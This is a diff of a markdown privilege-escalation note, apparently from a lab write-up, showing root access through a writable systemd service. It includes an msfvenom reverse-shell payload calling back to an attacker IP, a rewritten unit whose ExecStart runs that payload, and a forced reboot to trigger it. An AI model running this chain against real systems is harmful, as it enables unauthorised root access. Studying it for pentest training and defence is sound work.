@@ -4,29 +4,33 @@ description: Root access with writable services.
 
 # Writable services
 
-(root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
+```
+[cmeeks@hetemit ~]$ sudo -l
 
-OR
+User cmeeks may run the following commands on hetemit:
+    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
 
-have enough privilege to restart the service or host
+You have write privileges over /etc/systemd/system/pythonapp.service
+```
 
-The most important parameters here are :
+The most important parameters here are :&#x20;
 
-* User : The user that the service will run as.
-* Execstart : It specifies the command that will run when the service starts.
+• User : The user that the service will run as.
+
+• Execstart : It specifies the command that will run when the service starts.
 
 Now we want to get shell as root. There are many ways to do so with systemd services.
 
 ```
-$ cat /etc/systemd/system/pythonapp.service
+[cmeeks@hetemit ~]$ cat /etc/systemd/system/pythonapp.service
 [Unit]
 Description=Python App
 After=network-online.target
 
 [Service]
 Type=simple
-WorkingDirectory=/home/test/restjson_test
-ExecStart=flask run -h 0.0.0.0 -p 30000
+WorkingDirectory=/home/cmeeks/restjson_hetemit
+ExecStart=flask run -h 0.0.0.0 -p 50000
 TimeoutSec=30
 RestartSec=15s
 User=cmeeks
@@ -38,18 +42,18 @@ WantedBy=multi-user.target
 ```
 
 ```
-$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=80 -f elf -o reverse.elf
+$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.179 LPORT=80 -f elf -o reverse.elf
 ```
 
 ```
-echo "
+[cmeeks@hetemit ~]$ echo "
 [Unit]
 Description=Python App
 After=network-online.target
 
 [Service]
 Type=simple
-WorkingDirectory=/home/test/restjson_test
+WorkingDirectory=/home/cmeeks/restjson_hetemit
 ExecStart=/tmp/reverse.elf
 TimeoutSec=30
 RestartSec=15s
@@ -59,11 +63,7 @@ Restart=on-failure
 
 [Install]
 WantedBy=multi-user.target
-" > pythonapp.service
-```
+" > /etc/systemd/system/pythonapp.service
 
-```
-sudo reboot --reboot -f
-
-$ nc -nvlp 80
+[cmeeks@hetemit ~]$ sudo reboot --reboot -f
 ```
